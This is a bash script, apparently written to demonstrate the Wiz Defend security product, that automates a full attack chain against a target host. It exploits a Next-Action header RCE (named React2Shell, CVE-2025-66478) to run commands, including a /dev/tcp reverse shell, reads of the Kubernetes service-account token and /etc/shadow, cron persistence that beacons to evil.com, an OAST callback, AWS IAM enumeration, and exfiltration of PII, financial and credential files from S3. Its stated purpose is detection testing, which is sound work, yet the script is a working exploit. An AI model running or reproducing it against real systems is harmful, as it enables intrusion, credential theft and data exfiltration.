#!/bin/bash
#
# Wiz Demo Attack Script v4 - Clean Threat Chain
# ================================================
#
# PURPOSE: Create a clean, linear attack chain for Wiz Defend demonstration:
#   1. React2Shell (CVE-2025-66478) - Initial RCE exploitation
#   2. Container Activity - Post-exploitation triggering sensor detections
#   3. S3 Exfil - Data exfiltration via IRSA identity
#
# EXPECTED WIZ DEFEND DETECTIONS:
#   Phase 1 (RCE):
#     - Command execution via web service (webServiceOrDescendantOf signal)
#
#   Phase 2 (Container Activity):
#     - cer-sen-id-458: Reverse shell command line pattern
#     - cer-sen-id-*: Sensitive file access (/etc/shadow, K8s token)
#     - cer-sen-id-6: Cron job modification (persistence)
#     - cer-sen-id-10: DNS query to cryptomining domain
#     - cer-sen-id-323: DNS query to tunneling service
#     - Container drift detection (if applicable)
#
#   Phase 3 (Cloud Identity & Exfil):
#     - cer-aws-identity-unusualGetCallerIdentity: Unusual STS call
#     - S3 Data Events: ListBucket, GetObject (if enabled)
#
# OPTIONS:
#   --oast-domain <domain>  OAST/interact.sh domain for DNS callback (e.g., abc123.oast.fun)
#
# USAGE:
#   ./wiz-demo-v4.sh <nlb-hostname> [options]
#
# EXAMPLES:
#   # Auto-detect bucket from terraform:
#   ./wiz-demo-v4.sh k8s-reactv1-abc123.elb.ap-southeast-2.amazonaws.com
#
#   # With OAST callback (interact.sh):
#   ./wiz-demo-v4.sh k8s-reactv1-abc123.elb.ap-southeast-2.amazonaws.com --oast-domain abc123.oast.fun
#
#   # Specify bucket manually:
#   ./wiz-demo-v4.sh k8s-reactv1-abc123.elb.ap-southeast-2.amazonaws.com --bucket my-sensitive-bucket
#

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_DIR="${SCRIPT_DIR}/../../infrastructure/demo"
NLB_HOST=""
S3_BUCKET=""
OAST_DOMAIN=""

# Parse arguments
while [[ $# -gt 0 ]]; do
  case "$1" in
  --bucket)
    S3_BUCKET="${2:-}"
    shift 2
    ;;
  --oast-domain)
    OAST_DOMAIN="${2:-}"
    shift 2
    ;;
  --help | -h)
    echo "Usage: $0 <nlb-hostname> [options]"
    echo ""
    echo "Options:"
    echo "  --bucket <name>       S3 bucket name (auto-detected from terraform if omitted)"
    echo "  --oast-domain <dom>   OAST domain for DNS callback (e.g., abc123.oast.fun)"
    echo "  --help, -h            Show this help"
    exit 0
    ;;
  -*)
    echo -e "${RED}Unknown option: $1${NC}"
    exit 1
    ;;
  *)
    # First positional arg is NLB host
    if [[ -z "$NLB_HOST" ]]; then
      NLB_HOST="$1"
    fi
    shift
    ;;
  esac
done

# Validate input
if [[ -z "$NLB_HOST" ]]; then
  echo -e "${RED}Error: NLB hostname required${NC}"
  echo "Usage: $0 <nlb-hostname> [--bucket <name>] [--oast-domain <domain>]"
  exit 1
fi

# Auto-detect S3 bucket if not provided
if [[ -z "$S3_BUCKET" ]]; then
  echo -e "${YELLOW}Auto-detecting S3 bucket from terraform outputs...${NC}"
  if [[ -d "$TERRAFORM_DIR" ]]; then
    S3_BUCKET=$(cd "$TERRAFORM_DIR" && terraform output -raw sensitive_data_bucket_name 2>/dev/null || echo "")
  fi
  if [[ -z "$S3_BUCKET" ]]; then
    echo -e "${RED}Error: Could not auto-detect S3 bucket. Use --bucket <name>${NC}"
    exit 1
  fi
  echo -e "${GREEN}Detected bucket: ${S3_BUCKET}${NC}"
fi

# Generate OAST URL with unique subdomain if domain provided
OAST_URL=""
if [[ -n "$OAST_DOMAIN" ]]; then
  OAST_PREFIX="wiz-$(date +%s)-$RANDOM"
  OAST_URL="http://${OAST_PREFIX}.${OAST_DOMAIN}/"
  echo -e "${GREEN}OAST callback URL: ${OAST_URL}${NC}"
fi

echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║           Wiz Demo Attack Script v4 - Clean Chain             ║"
echo "╠════════════════════════════════════════════════════════════════╣"
echo "║  Target: $NLB_HOST"
echo "║  Bucket: $S3_BUCKET"
[[ -n "$OAST_URL" ]] && echo "║  OAST:   $OAST_URL"
echo "╚════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Function to execute command via React2Shell RCE
rce() {
  local cmd="$1"
  local desc="${2:-}"

  if [[ -n "$desc" ]]; then
    echo -e "${BLUE}[*] ${desc}${NC}"
  fi
  echo -e "${YELLOW}    └─ Command: ${cmd}${NC}"

  # Execute via Next-Action header RCE
  curl -s "http://${NLB_HOST}/" \
    -H "Next-Action: $(echo -n "$cmd" | base64)" \
    --max-time 10 2>/dev/null || true

  sleep 1
}

# ============================================================================
# PHASE 1: Initial Access - React2Shell RCE
# ============================================================================
phase1_initial_access() {
  echo ""
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}  PHASE 1: Initial Access - React2Shell (CVE-2025-66478)          ${NC}"
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${CYAN}  Expected Detection: Command execution via web service${NC}"
  echo ""

  rce "id && hostname" "Verifying RCE - whoami and hostname"
  rce "uname -a" "System reconnaissance"
  rce "cat /etc/os-release | head -3" "OS identification"
}

# ============================================================================
# PHASE 2: Container Activity - Trigger Sensor Detections
# ============================================================================
phase2_container_activity() {
  echo ""
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}  PHASE 2: Container Activity - Post-Exploitation                 ${NC}"
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${CYAN}  Expected Detections:${NC}"
  echo -e "${CYAN}    - cer-sen-id-458: Reverse shell command pattern${NC}"
  echo -e "${CYAN}    - cer-sen-id-10: DNS query to cryptomining domain${NC}"
  echo -e "${CYAN}    - cer-sen-id-323: DNS query to tunneling service${NC}"
  echo -e "${CYAN}    - Sensitive file access (K8s token, /etc/shadow)${NC}"
  echo -e "${CYAN}    - cer-sen-id-6: Cron job modification${NC}"
  echo ""

  # Reverse shell pattern (command triggers detection even if it fails)
  # This triggers cer-sen-id-458
  rce "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' 2>/dev/null || echo 'revshell pattern executed'" \
    "Reverse shell pattern (triggers cer-sen-id-458)"

  # DNS callback to cryptomining domain (triggers cer-sen-id-10)
  rce "nslookup pool.minexmr.com 2>/dev/null || host pool.minexmr.com 2>/dev/null || echo 'crypto DNS attempted'" \
    "DNS query to cryptomining domain (triggers cer-sen-id-10)"

  # DNS callback to tunneling service (triggers cer-sen-id-323)
  rce "nslookup tunnel.ngrok.io 2>/dev/null || host tunnel.ngrok.io 2>/dev/null || echo 'tunnel DNS attempted'" \
    "DNS query to tunneling service (triggers cer-sen-id-323)"

  # OAST callback if configured (C2 beacon behavior)
  if [[ -n "$OAST_URL" ]]; then
    rce "curl -s '${OAST_URL}' --connect-timeout 3 2>/dev/null || nslookup \$(echo '${OAST_URL}' | sed 's|http://||;s|/.*||') 2>/dev/null || echo 'OAST callback attempted'" \
      "OAST/C2 callback beacon"
  fi

  # K8s service account token access (sensitive file)
  rce "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50 && echo '...'" \
    "K8s service account token theft"

  # K8s namespace discovery
  rce "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace" \
    "K8s namespace discovery"

  # Shadow file access (triggers credential access detection)
  rce "cat /etc/shadow 2>/dev/null | head -1 || echo 'shadow access attempted'" \
    "Credential access - /etc/shadow"

  # Cron persistence (triggers cer-sen-id-6)
  rce "echo '* * * * * curl http://evil.com/beacon' | crontab - 2>/dev/null || echo 'cron persistence attempted'" \
    "Persistence via cron (triggers cer-sen-id-6)"
}

# ============================================================================
# PHASE 3: Cloud Identity Discovery - IRSA
# ============================================================================
phase3_cloud_identity() {
  echo ""
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}  PHASE 3: Cloud Identity Discovery - IRSA                        ${NC}"
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${CYAN}  Expected Detection: cer-aws-identity-unusualGetCallerIdentity${NC}"
  echo ""

  # Check for IRSA environment variables
  rce "env | grep -E '^AWS_' || echo 'No AWS env vars'" \
    "Discovering AWS environment variables (IRSA)"

  # Get caller identity - triggers CloudTrail detection
  rce "aws sts get-caller-identity 2>/dev/null || echo 'STS call attempted'" \
    "AWS identity discovery (triggers CloudTrail detection)"

  # Describe IAM role capabilities
  rce "aws iam list-attached-role-policies --role-name \$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null | cut -d'/' -f2) 2>/dev/null || echo 'IAM enumeration attempted'" \
    "IAM role policy enumeration"
}

# ============================================================================
# PHASE 4: S3 Exfiltration - Data Theft
# ============================================================================
phase4_s3_exfil() {
  echo ""
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}  PHASE 4: S3 Exfiltration - Sensitive Data Access                ${NC}"
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${CYAN}  Expected Detections: S3 Data Events (ListBucket, GetObject)${NC}"
  echo ""

  # List buckets (discovery)
  rce "aws s3 ls 2>/dev/null | head -5 || echo 'S3 list attempted'" \
    "S3 bucket enumeration"

  # Target specific bucket
  rce "aws s3 ls s3://${S3_BUCKET}/ 2>/dev/null || echo 'bucket access attempted'" \
    "Target bucket listing: ${S3_BUCKET}"

  # Exfiltrate sensitive files
  rce "aws s3 cp s3://${S3_BUCKET}/pii/customers.csv /tmp/exfil.csv 2>/dev/null && head -3 /tmp/exfil.csv || echo 'exfil attempted'" \
    "Exfiltrating PII data (customers.csv)"

  rce "aws s3 cp s3://${S3_BUCKET}/financial/transactions.csv /tmp/financial.csv 2>/dev/null && wc -l /tmp/financial.csv || echo 'exfil attempted'" \
    "Exfiltrating financial data (transactions.csv)"

  rce "aws s3 cp s3://${S3_BUCKET}/credentials/api_keys.json /tmp/creds.json 2>/dev/null && cat /tmp/creds.json | head -5 || echo 'exfil attempted'" \
    "Exfiltrating credentials (api_keys.json)"
}

# ============================================================================
# Main Execution
# ============================================================================
main() {
  echo -e "${YELLOW}Starting attack chain at $(date)${NC}"
  echo ""

  # Execute phases in order
  phase1_initial_access
  phase2_container_activity
  phase3_cloud_identity
  phase4_s3_exfil

  echo ""
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}  ATTACK CHAIN COMPLETE                                           ${NC}"
  echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
  echo ""
  echo -e "${CYAN}Expected Wiz Defend Threat:${NC}"
  echo -e "  └─ ${YELLOW}Multiple runtime detections will be grouped into a single threat${NC}"
  echo -e "  └─ ${YELLOW}Threat chain: ReactCVE → Container Activity → S3 Exfil${NC}"
  echo ""
  echo -e "${CYAN}Verify in Wiz Console:${NC}"
  echo -e "  └─ Navigate to: Defend → Threats → Filter by pod name"
  echo -e "  └─ Look for: Multiple correlated detections on react2shell pod"
  echo ""
  echo -e "${YELLOW}Completed at $(date)${NC}"
}

# Run main
main
